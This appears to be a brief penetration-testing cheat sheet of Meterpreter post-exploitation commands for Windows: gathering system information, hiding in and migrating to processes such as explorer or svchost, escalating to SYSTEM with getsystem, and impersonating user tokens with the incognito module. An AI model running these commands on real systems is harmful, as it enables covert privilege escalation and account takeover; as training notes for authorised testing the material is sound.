Once we have a shell with meterpreter we can gather some basic information and run some commands to make it easier for us.

> Gather Information:

```
getuid
```

```
sysinfo
```

> If our shell is not stable we can create a process and migrate to it, we also need to do this if we have a shell as a service account since notepad is not running for that:

```
execute -H -f notepad

migrate <process_id>
```

> We can use the command below to also check for processes and migrate to one of them such as explorer, svchost, and spoolsv:

```
ps

migrate <PID>
```

> Try Privesc if SeImpersonatePrivilege is available:

```
getprivs
```

```
getsystem -t 5
```

> See if anyone can be impersonated:

```
load incognito

list_tokens -u

impersonate_token <name>\\<name>
```


